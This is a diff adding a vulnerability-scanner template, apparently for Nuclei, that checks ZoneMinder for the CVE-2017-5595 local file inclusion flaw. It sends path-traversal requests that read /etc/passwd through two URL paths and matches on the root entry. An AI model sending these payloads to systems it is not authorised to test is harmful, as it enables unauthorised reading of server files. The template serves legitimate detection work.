@@ -1,0 +1,40 @@
+id: zoneminder-lfi-cve-2017-5595
+
+info:
+  name: ZoneMinder Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ZoneMinder versions 1.x to 1.30.0 are vulnerable to a Local File Inclusion vulnerability in the `web/views/file.php` file. The vulnerability arises from improper filtering of user input passed to the `readfile()` function, allowing attackers to read arbitrary local files.
+  classification:
+    cve-id: CVE-2017-5595
+  tags: lfi,file-inclusion
+
+http:
+  - raw:
+      - |
+        GET /index.php?view=file&path=/../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+  - raw:
+      - |
+        GET /zm/index.php?view=file&path=/../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
